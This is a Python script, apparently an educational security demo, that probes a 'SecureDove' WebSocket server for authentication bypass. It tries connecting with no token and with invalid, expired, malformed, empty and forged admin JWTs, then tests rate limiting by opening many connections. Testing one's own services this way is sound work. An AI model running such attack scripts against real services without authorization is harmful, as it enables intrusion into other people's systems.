#!/usr/bin/env python3
"""
WebSocket Authentication Bypass Attack Script for SecureDove
Educational demonstration of WebSocket authentication bypass vulnerability

This script demonstrates how an attacker could bypass WebSocket authentication
by exploiting improper token validation or missing authentication checks.
"""

import asyncio
import websockets
import json
import sys
import time
from typing import Optional, Dict, Any

class WebSocketAttacker:
    def __init__(self, ws_url: str = "ws://localhost:8000"):
        self.ws_url = ws_url
        self.session = None

    async def connect_websocket(self, token: Optional[str] = None) -> bool:
        """
        Attempt to connect to WebSocket with optional authentication token

        Args:
            token: JWT token for authentication (optional)

        Returns:
            True if connection successful, False otherwise
        """
        headers = {}
        if token:
            headers['Authorization'] = f'Bearer {token}'

        try:
            self.session = await websockets.connect(
                self.ws_url,
                extra_headers=headers,
                ping_interval=None,
                close_timeout=5
            )
            return True
        except Exception as e:
            print(f"    ❌ Connection failed: {str(e)}")
            return False

    async def test_message_sending(self) -> bool:
        """
        Test if we can send messages through the WebSocket

        Returns:
            True if message sending works, False otherwise
        """
        if not self.session:
            return False

        try:
            test_message = {
                "type": "test",
                "content": "Hello from attacker",
                "timestamp": int(time.time() * 1000)
            }

            await self.session.send(json.dumps(test_message))
            print("    ✅ Message sent successfully")

            # Try to receive response
            try:
                response = await asyncio.wait_for(self.session.recv(), timeout=2.0)
                print(f"    📨 Response received: {response[:100]}...")
                return True
            except asyncio.TimeoutError:
                print("    ⚠️  No response received (might be normal)")
                return True

        except Exception as e:
            print(f"    ❌ Message sending failed: {str(e)}")
            return False

    async def test_bypass_attempts(self) -> Dict[str, bool]:
        """
        Test various WebSocket authentication bypass techniques

        Returns:
            Dictionary mapping attack names to success status
        """
        attacks = {
            "no_auth": "Connect without any authentication",
            "invalid_token": "Connect with invalid JWT token",
            "expired_token": "Connect with expired JWT token",
            "malformed_token": "Connect with malformed JWT token",
            "empty_token": "Connect with empty token",
            "tampered_token": "Connect with tampered JWT token"
        }

        results = {}

        for attack_name, description in attacks.items():
            print(f"\n[+] Testing: {description}")

            # Close existing connection
            if self.session:
                await self.session.close()
                self.session = None

            # Prepare token based on attack type
            token = None
            if attack_name == "invalid_token":
                token = "invalid.jwt.token.here"
            elif attack_name == "expired_token":
                # Create an expired token (header.payload.signature)
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2MDAwMDAwMDAsImV4cCI6MTYwMDAwMDAwMH0.invalid_signature"
            elif attack_name == "malformed_token":
                token = "not-a-jwt-token-at-all"
            elif attack_name == "empty_token":
                token = ""
            elif attack_name == "tampered_token":
                # Tampered token with modified payload
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.tampered_signature"

            # Attempt connection
            connected = await self.connect_websocket(token)

            if connected:
                # Test if we can actually send messages
                can_send = await self.test_message_sending()
                results[attack_name] = can_send
                if can_send:
                    print(f"    🚨 VULNERABILITY: {attack_name} bypass successful!")
            else:
                results[attack_name] = False

        return results

    async def test_rate_limiting_bypass(self) -> bool:
        """
        Test if WebSocket connections can bypass rate limiting

        Returns:
            True if rate limiting can be bypassed, False otherwise
        """
        print("\n[+] Testing WebSocket rate limiting bypass")

        connections = []
        success_count = 0

        # Try to create multiple connections rapidly
        for i in range(10):
            try:
                ws = await websockets.connect(
                    self.ws_url,
                    ping_interval=None,
                    close_timeout=2
                )
                connections.append(ws)
                success_count += 1
                print(f"    ✅ Connection {i+1} established")
            except Exception as e:
                print(f"    ❌ Connection {i+1} failed: {str(e)}")
                break

        # Clean up connections
        for ws in connections:
            try:
                await ws.close()
            except:
                pass

        if success_count >= 5:  # Arbitrary threshold
            print(f"    🚨 VULNERABILITY: Created {success_count} concurrent connections")
            print("    Rate limiting may not be properly implemented")
            return True
        else:
            print(f"    ✅ Rate limiting appears effective ({success_count} connections)")
            return False

    async def demonstrate_vulnerability(self):
        """Main demonstration of WebSocket authentication bypass"""
        print("=" * 60)
        print("WEBSOCKET AUTHENTICATION BYPASS DEMONSTRATION")
        print("=" * 60)
        print("This script demonstrates WebSocket authentication bypass")
        print("vulnerabilities in the SecureDove application.\n")

        print(f"[*] Targeting WebSocket server: {self.ws_url}")

        # Test authentication bypass attempts
        auth_results = await self.test_bypass_attempts()

        # Test rate limiting
        rate_limit_bypass = await self.test_rate_limiting_bypass()

        # Clean up
        if self.session:
            await self.session.close()

        # Summary
        successful_bypasses = [k for k, v in auth_results.items() if v]

        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)
        print(f"Authentication bypass attempts: {len(auth_results)}")
        print(f"Successful bypasses: {len(successful_bypasses)}")

        if successful_bypasses:
            print("\n[+] WEBSOCKET VULNERABILITIES CONFIRMED!")
            print("The following authentication bypass methods worked:")
            for method in successful_bypasses:
                print(f"  - {method.replace('_', ' ').title()}")
        else:
            print("\n[-] No WebSocket authentication bypass vulnerabilities detected")

        if rate_limit_bypass:
            print("\n[+] RATE LIMITING VULNERABILITY CONFIRMED!")
            print("WebSocket connections can bypass rate limiting")
        else:
            print("\n[-] Rate limiting appears properly implemented")

        print("\n[*] Note: WebSocket authentication should validate tokens on connection")
        print("[*] Implement proper token validation and rate limiting")
        print("[*] Consider using secure WebSocket libraries with built-in auth")

async def main():
    if len(sys.argv) > 1:
        ws_url = sys.argv[1]
    else:
        ws_url = "ws://localhost:8000"

    print(f"[*] Targeting WebSocket server: {ws_url}")

    attacker = WebSocketAttacker(ws_url)
    await attacker.demonstrate_vulnerability()

if __name__ == "__main__":
    asyncio.run(main())